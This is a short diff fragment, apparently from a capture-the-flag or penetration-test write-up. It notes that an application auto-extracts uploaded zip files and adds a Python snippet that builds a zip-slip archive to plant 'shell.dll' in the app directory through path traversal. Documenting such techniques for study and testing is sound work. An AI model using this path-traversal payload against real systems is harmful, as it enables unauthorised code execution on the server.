@@ -352,5 +352,12 @@ So initial tests tell me that if i upload a .zip after a while it extracts the c
 
 Its also worth noting that the .zip file stays after the contents are extracted so that means the application will continue to extract the contents
 
-
+```python
+cat zipslip.py            
+import zipfile
+with zipfile.ZipFile('samples.zip', 'w') as z:
+    # Path traversal to app directory
+    z.writestr('../app/shell.dll', open('shell.dll', 'rb').read())
+```
+I
 
